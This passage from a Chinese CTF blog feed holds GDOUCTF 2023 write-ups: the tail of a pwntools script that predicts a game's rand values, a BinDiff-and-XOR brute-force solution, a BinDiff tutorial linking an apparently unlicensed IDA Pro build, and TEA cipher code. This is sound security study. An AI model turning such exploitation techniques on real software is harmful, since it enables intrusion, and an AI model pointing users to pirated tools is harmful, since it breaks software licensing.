punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token number">1522127470</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{bc2875e3-3232-4f70-8b78-006e8527f928}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%825.png" alt="2023GDOUCTF-真男人就下120层5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GDOUCTF 2023】L!S!</title>
      <link href="/posts/bc1a66dd.html"/>
      <url>/posts/bc1a66dd.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>对比两个程序中函数的相似性时，<code>BinDiff</code> 的使用方法</p></li><li><p>遇到未给定或难以确定的数据时，可以通过确定数据的范围，直接进行爆破</p></li><li><p>学到了一种新的转换小端序的方法</p></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】L!S!</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>解压得到两个文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDOUCTF2023-L%21S%211.png" alt="GDOUCTF2023-L!S!1.png"></p><p>文件名是个提示，<code>ls-original</code> 是原始的文件，<code>ls-patched</code> 是修改后的文件</p><p><strong>分别在 64 位 IDA 中打开这两个文件，发现他们的主函数内容几乎是一摸一样的</strong><br>（这里不贴图了，主函数特别长，有 1100 多行代码）</p><p><strong>结合文件的名字，这两个文件可能只有一点细微的差异，其他内容都是一样的</strong></p><p>识别二进制文件中的差异，可以使用 IDA 的 <code>BinDiff</code> 插件<br>首先下载 <code>BinDiff</code> <em>（在《二进制文件相似性》中有详细介绍）</em><br>识别结果如下，按相似度低到高排序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDOUCTF2023-L%21S%212.png" alt="GDOUCTF2023-L!S!2.png"></p><p>发现只有 <code>extract_dirs_from files</code> 这个函数的相似度是 0.84，其他的都是 1<br>所以突破口肯定就在函数 <code>extract_dirs_from files</code> 中了</p><p>跟进一下<br><code>ls-original</code> 中的函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDOUCTF2023-L%21S%213.png" alt="GDOUCTF2023-L!S!3.png"></p><p><code>ls-patched</code> 中的函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDOUCTF2023-L%21S%214.png" alt="GDOUCTF2023-L!S!4.png"></p><p>两边同时开对比看一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDOUCTF2023-L%21S%215.png" alt="GDOUCTF2023-L!S!5.png"></p><p>左边多定义了三个变量，继续往下翻，发现差别主要就是在 <code>lmao[]</code> 的地方：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDOUCTF2023-L%21S%216.png" alt="GDOUCTF2023-L!S!6.png"></p><p>黄色框中是相同的地方，主要是多出了红色框中的内容</p><p>将不同的部分提取出来：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">LABEL_7<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>v9<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token operator">*</span><span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3F7D132A2A252822LL</span><span class="token punctuation">;</span>          <span class="token operator">*</span>lmao <span class="token operator">=</span> <span class="token number">0x7D2E370A180F1604LL</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31207C7C381320LL</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x392A7F3F39132D13LL</span><span class="token punctuation">;</span>          v18 <span class="token operator">=</span> lmao<span class="token punctuation">;</span>          <span class="token keyword">do</span>            <span class="token operator">*</span>v18<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token operator">*</span>v7<span class="token punctuation">;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&amp;</span>lmao<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">!=</span> v18 <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">puts</span><span class="token punctuation">(</span>lmao<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里 <code>v18</code> 是一个指向 <code>lmao</code> 首地址的指针，而 <code>lmao</code> 的值是由 4 组 8 字节的数据拼接而成（<strong>小端序存放</strong>）<br><mark>（注意：拼接得到 lmao 的值时，要先对每一组小端序数据进行还原）</mark></p><p><code>while ( &amp;lmao[31] != v18 )</code> 控制 do while 循环一直将 <code>lmao</code> 中的所有元素全部与 <code>*v7</code> 的值进行异或 ，然后将异或结果输出</p><p>但是 <code>*v7</code> 的值在程序中无法得知，所以只能对 <code>*v7</code> 进行爆破<br>而 <code>*v7</code> 的取值只有 256 种可能，从 0 ~ 255</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> width_num<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 将小端序转换为正序  </span>    <span class="token keyword">global</span> <span class="token builtin">buffer</span>      hex_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 将int数据转换为十六进制的字符串  </span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span> <span class="token operator">!=</span> width_num <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>          hex_str <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>width_num <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 位数不足width的用0凑齐  </span>    index <span class="token operator">=</span> width_num      <span class="token keyword">while</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 每两位string转换为十六进制int型数据  </span>        <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  <span class="token comment"># 将int型作为char存入buffer  </span>        index <span class="token operator">-=</span> <span class="token number">2</span>      <span class="token keyword">return</span> <span class="token builtin">buffer</span>      <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存放结果的列表  </span>  lmao1 <span class="token operator">=</span> <span class="token number">0x7D2E370A180F1604</span>  lmao2 <span class="token operator">=</span> <span class="token number">0x3F7D132A2A252822</span>  lmao3 <span class="token operator">=</span> <span class="token number">0x392A7F3F39132D13</span>  lmao4 <span class="token operator">=</span> <span class="token number">0x31207C7C381320</span>    little_endian<span class="token punctuation">(</span>lmao1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  little_endian<span class="token punctuation">(</span>lmao2<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  little_endian<span class="token punctuation">(</span>lmao3<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  little_endian<span class="token punctuation">(</span>lmao4<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>  <span class="token comment"># [4, 22, 15, 24, 10, 55, 46, 125, 34, 40, 37, 42, 42, 19, 125, 63, 19, 45, 19, 57, 63, 127, 42, 57, 32, 19, 56, 124, 124, 32, 49]  </span>  <span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 直接爆破key  </span>    flag <span class="token operator">=</span> <span class="token string">""</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key = "</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>      <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> key  <span class="token comment"># 逐个与key异或  </span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  <span class="token comment"># 对应的字符存入flag  </span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token string">'HZCTF'</span> <span class="token keyword">in</span> flag <span class="token keyword">or</span> <span class="token string">'NSSCTF'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>  <span class="token comment"># 只输出包含'HZCTF'或'NSSCTF'的结果  </span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><blockquote><p>发现官方 Writeup 有一种更方便地将一组小端序数据合并成一个正序数据的方法，记录一下<br>（<strong>但也有一个缺点，无法自己随意控制数据的长度，只能统一为相同长度</strong>）</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct    stack_bytes <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token number">0x7d2e370a180f1604</span><span class="token punctuation">,</span>      <span class="token number">0x3f7d132a2a252822</span><span class="token punctuation">,</span>      <span class="token number">0x392a7f3f39132d13</span><span class="token punctuation">,</span>      <span class="token number">0x31207c7c381320</span>  <span class="token punctuation">]</span>    <span class="token comment"># 将stack_bytes中的数据按照小端字节序打包为二进制数据  </span>xored_bytes <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;4Q"</span><span class="token punctuation">,</span> <span class="token operator">*</span>stack_bytes<span class="token punctuation">)</span>  <span class="token comment"># 其中，&lt; 表示小端序，Q代表一个无符号长整型  </span><span class="token comment"># 每个无符号长整型整数占8个字节，所以总共打包出来的字符串长度为32个字节  </span><span class="token comment"># b'\x04\x16\x0f\x18\n7.&#125;"(%**\x13&#125;?\x13-\x139?\x7f*9 \x138|| 1\x00'  </span>  <span class="token keyword">for</span> xorkey <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      output <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>byte <span class="token operator">^</span> xorkey <span class="token keyword">for</span> byte <span class="token keyword">in</span> xored_bytes<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token string">b"HZCTF&#123;"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>    <span class="token comment"># b'HZCTF&#123;b1ndiff_1s_a_us3ful_t00l&#125;L'  </span><span class="token comment"># （因为在lmao4的高位补了一个0，所以多输出了一个L）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{b1ndiff_1s_a_us3ful_t00l}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDOUCTF2023-L%21S%217.png" alt="GDOUCTF2023-L!S!7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制文件相似性</title>
      <link href="/posts/11cad674.html"/>
      <url>/posts/11cad674.html</url>
      
        <content type="html"><![CDATA[<h1 id="BinDiff"><a href="#BinDiff" class="headerlink" title="BinDiff"></a>BinDiff</h1><blockquote><p>BinDiff 是一款二进制文件比对工具，可帮助漏洞研究人员和工程师快速找到反汇编代码的异同，同时，使用 BinDiff 还可以识别和隔离供应商提供的补丁中的漏洞修复</p></blockquote><hr><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><p>BinDiff 是一款 java 程序，因此需要安装 <a href="https://www.oracle.com/java/technologies/downloads/#java8-windows">java jdk</a> 环境，用 <code>java -version</code> 验证安装是否成功</p></li><li><p>BinDiff 需要借助 IDA pro 进行分析，所以需要安装 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> （官方说明需要 6.8 及以上版本）</p></li><li><p><a href="https://www.zynamics.com/software.html">下载 BinDiff</a> （BinDiff 同时支持 Windows、Linux、Mac）<br>Windows 平台选择 <code>bindiffx.msi</code> 下载<br>像平时安装软件一样正常安装即可（<strong>低版本的 BinDiff 可能需要手动选择 IDA pro 的安装路径，否则 BinDiff 无法正常运行</strong>）</p></li></ol><hr><h2 id="在-BinDiff-中使用"><a href="#在-BinDiff-中使用" class="headerlink" title="在 BinDiff 中使用"></a>在 BinDiff 中使用</h2><blockquote><p>注意，BinDiff 并不能直接分析 exe 程序，只能分析 IDA 生成的 <code>.i64</code> 数据库文件</p></blockquote><ol><li><p>将想要对比相似性的两个二进制程序分别用 IDA 打开，待 IDA 分析完成后，关闭 IDA，IDA 会在本地生成一个数据库文件</p></li><li><p>在 BinDiff 中 <code>主菜单 ——&gt; File ——&gt; New Workspace</code> 新建一个工作空间<br>然后 <code>主菜单 ——&gt; Diffs ——&gt; New Diff</code>，选择生成的两个 IDA 数据库文件，待分析完成即可</p></li><li><p><strong>我就是这样操作的，但是会有一个报错，暂时还没有解决报错问题。。。</strong></p></li><li><p>如果你的情况跟我一样，那就试试下面的方法吧</p></li></ol><hr><h2 id="在-IDA-中使用"><a href="#在-IDA-中使用" class="headerlink" title="在 IDA 中使用"></a>在 IDA 中使用</h2><blockquote><p>如果还是报错，可以直接在 IDA 中使用 BinDiff 插件</p></blockquote><ol><li><strong>因为在安装 BinDiff 时，选择了本地正确的 IDA 安装目录，BinDiff 会把插件放在 IDA 的安装目录下的 plugins 文件夹里</strong>，如图：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%9B%B8%E4%BC%BC%E6%80%A72.png" alt="二进制文件相似性2.png">  </p><p>如果没有的话，其实 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> 这个版本的 IDA 是内置了 BinDiff 的，可以直接使用</p><ol start="2"><li>打开其中一个 IDA 数据库文件，在 IDA 中使用快捷键：<code>Ctrl + 6</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%9B%B8%E4%BC%BC%E6%80%A71.png" alt="二进制文件相似性1.png">  </p><p>点击 <code>Diff Database...</code>，然后选择另外一个二进制程序的 IDA 数据库文件  </p><p>待分析完成，界面如下：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E7%9B%B8%E4%BC%BC%E6%80%A73.png" alt="二进制文件相似性3.png">  </p><p>到此，说明插件安装成功</p><ol start="3"><li>左边绿色框中，<code>Similarity</code> 的值表示两个文件中函数的相似度，值越接近 1 表示越相似</li></ol>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GDOUCTF 2023】Tea</title>
      <link href="/posts/3d789eff.html"/>
      <url>/posts/3d789eff.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><code>tea</code> 算法的加密解密</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】Tea</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>解压得到一个 <code>teaaaa.exe</code> 程序，试运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-tea1.png" alt="2023GDOUCTF-tea1.png"></p><p>给出了提示，让我们输入十六进制数据来获得 flag</p><p>用 64 位 IDA 打开，由于没有 <code>main()</code> 函数，查看字符串：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-tea2.png" alt="2023GDOUCTF-tea2.png"></p><p>可以看到上面是程序的输出</p><p>注意到下面有一句提示：<code>fault!\nYou can go online and learn the tea algorithm!</code><br>定位过去，在 <code>sub_140016230()</code> 函数中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-tea3.png" alt="2023GDOUCTF-tea3.png"></p><p>观察形式，<code>v6</code> 的值决定了用户的输入是否正确，跟进一下 <code>sub_140011352(v8)</code> 函数，发现 <code>sub_140011352(v8)</code> 会执行 <code>sub_140011B60(a1)</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-tea4.png" alt="2023GDOUCTF-tea4.png"></p><p>后面的一个 <code>for</code> 循环用来校验 <code>*(a1 + 4 * j)</code> 的值是否与 <code>v8[j]</code> 中的值相等<br>只有当每一个值都相同时，<code>v7</code> 才会一直保持非 0，于是返回一个非 0 值给 <code>v6</code>，就输入正确<br><strong>（不过这里的逻辑貌似有点 bug，其实只需要 a1 的最后一个值与 v8 的最后一个值相等即可）</strong><br>所以这其实是一个 <code>check()</code> 函数</p><p>注意到 <code>check</code> 失败的时候会提示我们去了解一下 <code>tea</code> 算法：</p><blockquote><p>TEA 算法最初是由剑桥计算机实验室的 David Wheeler 和 Roger Needham 在 1994 年设计的。 TEA 算法使用 64 位的明文分组和 128 位的密钥，它使用 Feistel 分组加密框架，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了</p><p>该算法使用了一个神秘常数 <code>δ（Delta）</code> 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 <code>δ（Delta）</code> 的精确值似乎并不重要，这里 TEA 把它定义为 <code>δ =「(√5 - 1)231」</code>（也就是程序中的 <code>0x9e3779b9</code>）</p></blockquote><p>网上找的 <code>tea</code> 算法加解密源码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span><span class="token keyword">void</span> <span class="token function">tea_encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 进行32次迭代加密，Tea算法作者的建议迭代次数</span>  <span class="token comment">// 利用多次双位移和异或将明文与密钥扩散混乱，并将两个明文互相加密</span>    l <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>  <span class="token comment">// 累加Delta的值</span>    r <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>l <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> l<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">tea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  sum <span class="token operator">=</span> DELTA <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">;</span>  <span class="token comment">// 32次迭代累加后delta的值</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>l <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> l<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>    l <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0x00010203</span><span class="token punctuation">,</span> <span class="token number">0x04050607</span><span class="token punctuation">,</span> <span class="token number">0x08090a0b</span><span class="token punctuation">,</span> <span class="token number">0x0c0d0e0f</span><span class="token 